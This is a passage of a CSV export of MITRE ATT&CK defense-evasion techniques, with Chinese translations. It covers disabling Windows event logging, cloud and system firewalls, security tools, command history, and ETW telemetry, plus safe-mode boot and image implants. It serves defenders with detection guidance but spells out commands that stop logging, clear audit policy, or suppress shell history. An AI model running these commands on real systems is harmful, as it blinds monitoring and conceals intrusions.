Monitor the addition of the MiniNT registry key in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control`, which may disable Event Viewer.(Citation: def_ev_win_event_logging)",Windows,"Application Log: Application Log Content, Command: Command Execution, Process: Process Creation, Script: Script Execution, Sensor Health: Host Status, Windows Registry: Windows Registry Key Creation",True,T1562,Log analysis,"Prasanth Sadanala, Cigna Information Protection (CIP) - Threat Response Engineering Team",Administrator,,,,,,"(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Wevtutil Microsoft Documentation),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Dragos Crashoverride 2018),(Citation: def_ev_win_event_logging),(Citation: win_xml_evt_log)",削弱防御/破环防御：禁用 Windows 事件日志记录,攻击者可能会禁用 Windows 事件日志记录以限制可用于检测和审计的数据。 Windows 事件日志记录用户和系统活动，例如登录尝试、进程创建等。（引用：Windows 日志事件）安全工具和分析人员使用此数据生成检测。 EventLog 服务维护来自各种系统组件和应用程序的事件日志。（引用：EventLog_Core_Technologies）默认情况下，该服务在系统开机时自动启动。由本地安全策略 (secpol.msc) 维护的审核策略定义 EventLog 服务记录哪些系统事件。可以通过运行 secpol.msc 来更改安全审计策略设置，然后导航到 <code>Security Settings\Local Policies\Audit Policy</code> 进行基本审计策略设置或 <code>Security Settings\Advanced Audit Policy Configuration</code > 用于高级审计策略设置。（引用：Audit_Policy_Microsoft）（引用：Advanced_sec_audit_policy_settings）<code>auditpol.exe</code> 也可用于设置审计策略。（引用：auditpol）攻击者可能针对系统范围的日志记录或仅针对一个特定的应用程序。例如，可以使用以下 PowerShell 行禁用 EventLog 服务：<code>Stop-Service -Name EventLog</code>.(Citation: Disable_Win_Event_Logging) 此外，攻击者可以使用 <code>auditpol</code> 及其子- 命令提示符中的命令以禁用审计或清除审计策略。要启用或禁用指定的设置或审计类别，攻击者可以使用 <code>/success</code> 或 <code>/failure</code> 参数。例如，<code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code> 关闭帐户登录类别的审核。（引用：auditpol.exe_STRONTIC）（引用：T1562.002_redcanaryco ) 要清除审计策略，攻击者可以运行以下行：<code>auditpol /clear /y</code> 或 <code>auditpol /remove /allusers</code>。（引用：T1562.002_redcanaryco）通过禁用 Windows事件记录，攻击者可以在操作时留下更少的妥协证据。
T1562.007,Impair Defenses: Disable or Modify Cloud Firewall,"Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004). 

Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity.(Citation: Expel IO Evil in AWS)

Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.",https://attack.mitre.org/techniques/T1562/007,24 June 2020,08 March 2021,1.1,Defense Evasion,Monitor cloud logs for modification or creation of new security groups or firewall rules.,IaaS,"Firewall: Firewall Disable, Firewall: Firewall Rule Modification",True,T1562,,Expel,User,,,,,,",(Citation: Expel IO Evil in AWS)",削弱防御/破环防御：禁用或修改云防火墙,攻击者可能会禁用或修改云环境中的防火墙，以绕过限制对云资源访问的控制。云防火墙与 [禁用或修改系统防火墙](https://attack.mitre.org/techniques/T1562/004) 中描述的系统防火墙是分开的。云环境通常使用限制性安全组和防火墙规则，这些规则仅允许来自受信任 IP 地址的网络活动通过预期的端口和协议进行。攻击者可能会引入新的防火墙规则或策略以允许访问受害云环境。例如，攻击者可以使用脚本或实用程序在现有安全组中创建新的入口规则，以允许任何 TCP/IP 连接。（引用：在 AWS 中驱逐 IO Evil）修改或禁用云防火墙可能会启用攻击者 C2 横向通信移动和/或数据泄露，否则将不允许。
T1562.004,Impair Defenses: Disable or Modify System Firewall,"Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.

Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. ",https://attack.mitre.org/techniques/T1562/004,21 February 2020,29 March 2020,1.0,Defense Evasion,Monitor processes and command-line arguments to see if firewalls are disabled or modified. Monitor Registry edits to keys that manage firewalls.,"Linux, Windows, macOS","Command: Command Execution, Firewall: Firewall Disable, Firewall: Firewall Rule Modification, Windows Registry: Windows Registry Key Modification",True,T1562,Firewall,,,,,,,,"(Citation: US-CERT TYPEFRAME June 2018),(Citation: Trend Micro Cyclops Blink March 2022),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: US-CERT BADCALL),(Citation: Fidelis njRAT June 2013),(Citation: FireEye APT30),(Citation: Securelist Kimsuky Sept 2013),(Citation: US-CERT HARDRAIN March 2018),(Citation: Novetta Blockbuster Tools),(Citation: Unit42 CookieMiner Jan 2019),(Citation: FoxIT Wocao December 2019),(Citation: Talos Rocke August 2018),(Citation: NCSC Cyclops Blink February 2022),(Citation: ESET InvisiMole June 2018),(Citation: TechNet Netsh),(Citation: Malwarebytes DarkComet March 2018),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Trend Micro njRAT 2018),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Talos ZxShell Oct 2014),(Citation: Novetta Blockbuster Loaders),(Citation: Zscaler Kasidet),(Citation: Aqua TeamTNT August 2020),(Citation: Novetta Blockbuster),(Citation: TechNet Netsh Firewall),(Citation: ESET Grandoreiro April 2020),(Citation: US-CERT TA18-074A),(Citation: Cisco H1N1 Part 2),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: DigiTrust NanoCore Jan 2017),(Citation: Group-IB Anunak),(Citation: TrendMicro DarkComet Sept 2014),",削弱防御/破环防御：禁用或修改系统防火墙,攻击者可能会禁用或修改系统防火墙，以绕过限制网络使用的控制。更改可能是禁用整个机制以及添加、删除或修改特定规则。这可以通过多种方式完成，具体取决于操作系统，包括通过命令行、编辑 Windows 注册表项和 Windows 控制面板。修改或禁用系统防火墙可能会导致对手 C2 通信、横向移动和/或数据泄露，否则这些都是不允许的。
T1562.001,Impair Defenses: Disable or Modify Tools,"Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)

Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls)

In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.

Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)

Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",https://attack.mitre.org/techniques/T1562/001,21 February 2020,24 October 2022,1.3,Defense Evasion,"Monitor processes and command-line arguments to see if security tools/services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Monitoring for changes to other known features used by deployed security tools may also expose malicious activity.

Lack of expected log events may be suspicious.","Containers, IaaS, Linux, Windows, macOS","Command: Command Execution, Driver: Driver Load, Process: Process Termination, Sensor Health: Host Status, Service: Service Metadata, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification",True,T1562,"Anti-virus, File monitoring, Host intrusion prevention systems, Log analysis, Signature-based detection","Alex Soler, AttackIQ; Cian Heasley; Daniel Feichter, @VirtualAllocEx, Infosec Tirol; Gal Singer, @galsinger29, Team Nautilus Aqua Security; Gordon Long, Box, Inc., @ethicalhax; Lucas Heiligenstein; Nathaniel Quist, Palo Alto Networks; Sarathkumar Rajendran, Microsoft Defender365; Ziv Karliner, @ziv_kr, Team Nautilus Aqua Security",,,,CAPEC-578,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: ESET Gamaredon June 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: Cylance Sodinokibi July 2019),(Citation: FireEye Ransomware Feb 2020),(Citation: Trend Micro Tick November 2019),(Citation: Imminent Unit42 Dec2019),(Citation: Arxiv Avaddon Feb 2021),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Talos Promethium June 2020),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Group IB Ransomware September 2020),(Citation: TrendMicro Netwalker May 2020),(Citation: US-CERT SHARPKNOT June 2018),(Citation: FireEye Metamorfo Apr 2018),(Citation: Novetta Blockbuster),(Citation: Medium Metamorfo Apr 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Forcepoint Monsoon),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Cybereason Clop Dec 2020),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: 20 macOS Common Tools and Techniques),(Citation: Sophos Ragnar May 2020),(Citation: McAfee Night Dragon),(Citation: Cisco Ukraine Wipers January 2022),(Citation: McAfee Gold Dragon),(Citation: McAfee Maze March 2020),(Citation: Wired Lockergoga 2019),(Citation: Donut Github),(Citation: PaloAlto NanoCore Feb 2016),(Citation: IBM MegaCortex),(Citation: ESET Ebury Oct 2017),(Citation: CERT-FR PYSA April 2020),(Citation: Prevx Carberp March 2011),(Citation: CarbonBlack RobbinHood May 2019),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Grandoreiro April 2020),(Citation: Cisco H1N1 Part 2),(Citation: Microsoft PLATINUM April 2016),(Citation: Baumgartner Naikon 2015),(Citation: FireEye SUNBURST Additional Details Dec 2020),(Citation: Cisco Talos Intelligence Group),(Citation: Fortinet Agent Tesla June 2017),(Citation: FireEye FIN6 Apr 2019),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: Securelist Kimsuky Sept 2013),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Novetta Blockbuster Tools),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: DFIR Ryuk's Return October 2020),(Citation: Check Point Warzone Feb 2020),(Citation: Talos Rocke August 2018),(Citation: NCC Group Team9 June 2020),(Citation: Unit 42 Rocke January 2019),(Citation: Unit 42 WhisperGate January 2022),(Citation: Malwarebytes DarkComet March 2018),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: Dragos EKANS),(Citation: Talos ZxShell Oct 2014),(Citation: Novetta Blockbuster Loaders),(Citation: Intrinsec Egregor Nov 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: Korean FSI TA505 2020),(Citation: Trend Micro Skidmap),(Citation: Symantec WastedLocker June 2020),(Citation: SANS Conficker),(Citation: Fortinet Diavol July 2021),(Citation: Cylance Cleaver),(Citation: TrendMicro DarkComet Sept 2014),(Citation: CrowdStrike Putter Panda),(Citation: objsee mac malware 2017),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Sophos Netwalker May 2020),(Citation: Unit 42 Hildegard Malware),(Citation: Sophos Maze VM September 2020),(Citation: Trend Micro Muddy Water March 2021),(Citation: wardle evilquest parti),(Citation: Check Point Meteor Aug 2021),(Citation: Medium S2W WhisperGate January 2022),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: DigiTrust NanoCore Jan 2017),",削弱防御/破环防御：禁用或修改工具,攻击者可能会修改和/或禁用安全工具，以避免可能检测到他们的恶意软件/工具和活动。这可能采取多种形式，例如杀死安全软件进程或服务，修改/删除注册表项或配置文件，使工具无法正常运行，或其他干扰安全工具扫描或报告信息的方法。攻击者还可能禁用更新，以防止最新的安全补丁到达受害者系统上的工具。（引用：SCADAfence_ransomware）攻击者还可能篡改安全工具部署和使用的工件。安全工具可能会对系统组件进行动态更改，以保持对特定事件的可见性。例如，安全产品可以加载它们自己的模块和/或修改由进程加载的模块以促进数据收集。与 [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006) 类似，攻击者可能会取消挂钩或以其他方式修改工具添加的这些功能（尤其是那些存在于用户空间或攻击者可能访问的功能）以避免检测。（引用：OutFlank 系统调用）（引用：MDSec 系统调用）在云环境中，被攻击者禁用的工具可能包括向 AWS CloudWatch 或 Google Cloud Monitor 等服务报告的云监控代理。此外，虽然防御工具可能具有防篡改机制，但攻击者可能会滥用合法的 rootkit 删除工具包等工具来破坏和/或禁用这些工具。（引用：chasing_avaddon_ransomware）（引用：dharma_ransomware）（引用：demystifying_ryuk）（引用：doppelpaymer_crowdstrike ）例如，攻击者使用 GMER 等工具来查找并关闭受感染系统上的隐藏进程和防病毒软件。（引用：demystifying_ryuk）此外，攻击者可能会利用防病毒软件的合法驱动程序来访问内核空间（即[用于提权的利用](https://attack.mitre.org/techniques/T1068)），这可能导致绕过防篡改功能。（引用：avoslocker_ransomware）
T1562.010,Impair Defenses: Downgrade Attack,"Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls such as logging. For example, [PowerShell](https://attack.mitre.org/techniques/T1059/001) versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to [Impair Defenses](https://attack.mitre.org/techniques/T1562) while running malicious scripts that may have otherwise been detected.(Citation: CrowdStrike BGH Ransomware 2021)(Citation: Mandiant BYOL 2018)(Citation: att_def_ps_logging)

Adversaries may downgrade and use less-secure versions of various features of a system, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or even network protocols that can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557).(Citation: Praetorian TLS Downgrade Attack 2014)",https://attack.mitre.org/techniques/T1562/010,08 October 2021,19 May 2022,1.1,Defense Evasion,"Monitor for commands or other activity that may be indicative of attempts to abuse older or deprecated technologies (ex: <code>powershell –v 2</code>). Also monitor for other abnormal events, such as execution of and/or processes spawning from a version of a tool that is not expected in the environment.

Monitor for Windows event ID (EID) 400, specifically the <code>EngineVersion</code> field which shows the version of PowerShell running and may highlight a malicious downgrade attack.(Citation: inv_ps_attacks)","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation, Process: Process Metadata",True,T1562,,"Daniel Feichter, @VirtualAllocEx, Infosec Tirol; Mayuresh Dani, Qualys",,,,,,,",",削弱防御/破环防御：降级攻击,攻击者可能会降级或使用可能已过时、易受攻击和/或不支持更新的安全控制（例如日志记录）的系统功能版本。例如，[PowerShell](https://attack.mitre.org/techniques/T1059/001) 版本 5+ 包括可以记录执行脚本内容的脚本块日志记录 (SBL)。但是，攻击者可能会尝试执行不支持 SBL 的先前版本的 PowerShell，意图 [削弱防御](https://attack.mitre.org/techniques/T1562)，同时运行可能以其他方式检测到的恶意脚本.（引用：CrowdStrike BGH Ransomware 2021）（引用：Mandiant BYOL 2018）（引用：att_def_ps_logging）攻击者可能会降级并使用系统各种功能的安全性较低的版本，例如 [命令和脚本解释器]（https:// attack.mitre.org/techniques/T1059)s 甚至网络协议可以被滥用以启用 [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)。（引用：Praetorian TLS 降级攻击 2014)
T1562.003,Impair Defenses: Impair Command History Logging,"Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. 

On Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.

Adversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to ""ignoredups"". In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. 

On Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",https://attack.mitre.org/techniques/T1562/003,21 February 2020,01 September 2022,2.2,Defense Evasion,"Correlating a user session with a distinct lack of new commands in their <code>.bash_history</code> can be a clue to suspicious behavior. Additionally, users checking or changing their <code>HISTCONTROL</code>, <code>HISTFILE</code>, or <code>HISTFILESIZE</code> environment variables may be suspicious.

Monitor for modification of PowerShell command history settings through processes being created with <code>-HistorySaveStyle SaveNothing</code> command-line arguments and use of the PowerShell commands <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code> and <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to clear or disable historical log data with built-in features native to the network device platform.  Monitor such command activity for unexpected or unauthorized use of commands being run by non-standard users from non-standard locations.","Linux, Network, Windows, macOS","Command: Command Execution, Sensor Health: Host Status, User Account: User Account Metadata",True,T1562,"Host forensic analysis, Log analysis","Austin Clark, @c2defense; Emile Kenning, Sophos; Vikas Singh, Sophos",,,,CAPEC-13,,,"(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Securing bash history)",削弱防御/破环防御：削弱命令历史记录,攻击者可能会破坏命令历史记录以隐藏他们在受感染系统上运行的命令。各种命令解释器跟踪用户在终端中键入的命令，以便用户可以追溯他们所做的事情。在 Linux 和 macOS 上，命令历史记录在环境变量 <code>HISTFILE</code> 指向的文件中进行跟踪。当用户注销系统时，此信息将刷新到用户主目录中名为 <code>~/.bash_history</code> 的文件中。 <code>HISTCONTROL</code> 环境变量跟踪应该由 <code>history</code> 命令保存的内容，并在用户注销时最终保存到 <code>~/.bash_history</code> 文件中. <code>HISTCONTROL</code> 默认情况下在 macOS 上不存在，但可以由用户设置并且会受到尊重。攻击者可以清除历史环境变量 (<code>unset HISTFILE</code>) 或将命令历史大小设置为零 (<code>export HISTFILESIZE=0</code>) 以防止记录命令。此外，<code>HISTCONTROL</code> 可以配置为忽略以空格开头的命令，只需将其设置为“ignorespace”即可。 <code>HISTCONTROL</code> 也可以设置为忽略重复命令，方法是将其设置为“ignoredups”。在某些 Linux 系统中，默认设置为“ignoreboth”，这涵盖了前面的两个示例。这意味着“ls”不会被保存，但“ls”会被历史保存。攻击者可以通过简单地在其所有终端命令前添加一个空格来滥用此操作而不会留下痕迹。在 Windows 系统上，<code>PSReadLine</code> 模块跟踪所有 PowerShell 会话中使用的命令并将它们写入文件 (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code > 默认情况下）。攻击者可以使用 <code>Set-PSReadLineOption -HistorySavePath {File Path}</code> 更改这些日志的保存位置。这将导致 <code>ConsoleHost_history.txt</code> 停止接收日志。此外，可以使用 PowerShell 命令 <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code> 关闭对此文件的日志记录。（引用：Microsoft PowerShell 命令历史）（引用：Sophos PowerShell 命令审核）（引用：Sophos PowerShell 命令历史取证）攻击者还可以利用网络设备上的 [网络设备 CLI](https://attack.mitre.org/techniques/T1059/008) 禁用历史命令日志记录（例如 <code>no logging</code >）。
T1562.006,Impair Defenses: Indicator Blocking,"An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).

ETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.

In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.

In Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors (Citation: LemonDuck).",https://attack.mitre.org/techniques/T1562/006,19 March 2020,30 June 2022,1.1,Defense Evasion,"Detect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.

Depending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session. (Citation: Medium Event Tracing Tampering 2018) To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: <code>HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AUTOLOGGER_NAME\{PROVIDER_GUID}</code>","Linux, Windows, macOS","Command: Command Execution, Sensor Health: Host Status, Windows Registry: Windows Registry Key Modification",True,T1562,"Anti-virus, Host intrusion prevention systems",Rob Smith,,,,CAPEC-571,,,"(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Qualys Hermetic Wiper March 2022),(Citation: ESET Ebury Feb 2014),(Citation: Trend Micro Waterbear December 2019),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Microsoft ETW May 2018)",削弱防御/破环防御：指示器阻塞,攻击者可能会试图阻止通常由传感器捕获的指标或事件被收集和分析。这可能包括恶意重定向（引用：Microsoft Lamin 2017 年 9 月），甚至禁用基于主机的传感器，例如 Windows 事件跟踪 (ETW)，（引用：Microsoft 关于事件跟踪 2018）通过篡改控制收集和流动的设置事件遥测。 （引用：Medium Event Tracing Tampering 2018）这些设置可以存储在系统中的配置文件和/或注册表中，也可以通过管理实用程序（如 [PowerShell]（https://attack.mitre.org/）进行访问）技术/T1059/001) 或 [Windows 管理规范](https://attack.mitre.org/techniques/T1047)。 ETW 中断可以通过多种方式实现，但最直接的方法是使用 [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet 定义条件或通过接口直接与注册处进行更改。在基于网络的指标报告的情况下，攻击者可能会阻止与报告相关的流量以阻止集中分析。这可以通过多种方式实现，例如停止负责转发遥测数据的本地进程和/或创建基于主机的防火墙规则以阻止流量流向负责聚合事件的特定主机，例如安全信息和事件管理 (SIEM) 产品.在 Linux 环境中，攻击者可能会禁用或重新配置日志处理工具，例如 syslog 或 nxlog，以抑制检测和监控功能以促进后续行为（引文：LemonDuck）。
T1562.009,Impair Defenses: Safe Mode Boot,"Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Ransomware 2019)

Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.(Citation: Microsoft bcdedit 2021)

Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)",https://attack.mitre.org/techniques/T1562/009,23 June 2021,31 August 2021,1.0,Defense Evasion,"Monitor Registry modification and additions for services that may start on safe mode. For example, a program can be forced to start on safe mode boot by adding a <code>\*</code> in front of the ""Startup"" value name: <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\[""\*Startup""=""{Path}""]</code> or by adding a key to <code>HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal</code>.(Citation: BleepingComputer REvil 2021)(Citation: Sophos Snatch Ransomware 2019)

Monitor execution of processes and commands associated with making configuration changes to boot settings, such as <code>bcdedit.exe</code> and <code>bootcfg.exe</code>.(Citation: Microsoft bcdedit 2021)(Citation: Microsoft Bootcfg)(Citation: Sophos Snatch Ransomware 2019)",Windows,"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1562,"Anti-virus, Host Intrusion Prevention Systems","Jorell Magtibay, National Australia Bank Limited; Kiyohito Yamamoto, RedLark, NTT Communications; Yusuke Kubo, RedLark, NTT Communications",Administrator,,,,,,"(Citation: BleepingComputer REvil 2021),(Citation: CyberArk Labs Safe Mode 2016)",削弱防御/破环防御：安全模式启动,攻击者可能会滥用 Windows 安全模式来禁用终端防御。安全模式使用一组有限的驱动程序和服务启动 Windows 操作系统。以安全模式启动 Windows 后，终端检测和响应 (EDR) 工具等第三方安全软件可能无法启动。安全模式有两个版本：安全模式和带网络的安全模式。可以在安全模式启动后启动其他服务。（引用：Microsoft 安全模式）（引用：Sophos Snatch Ransomware 2019）攻击者可能会滥用安全模式来禁用可能无法以有限启动启动的终端防御。主机可以通过修改引导配置数据 (BCD) 存储在下次重新启动后强制进入安全模式，这些存储是管理引导应用程序设置的文件。（引用：Microsoft bcdedit 2021）攻击者也可能将其恶意应用程序添加到最小列表通过修改相关注册表值以安全模式启动的服务（即[修改注册表]（https://attack.mitre.org/techniques/T1112））。恶意 [组件对象模型](https://attack.mitre.org/techniques/T1559/001) (COM) 对象也可能在安全模式下注册和加载。（引用：Sophos Snatch Ransomware 2019）（引用：CyberArk Labs安全模式 2016）（引用：Cybereason Nocturnus MedusaLocker 2020）（引用：BleepingComputer REvil 2021）
T1525,Implant Internal Image,"Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001), this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)

A tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)",https://attack.mitre.org/techniques/T1525,04 September 2019,08 March 2022,2.1,Persistence,"Monitor interactions with images and containers by users to identify ones that are added or modified anomalously.

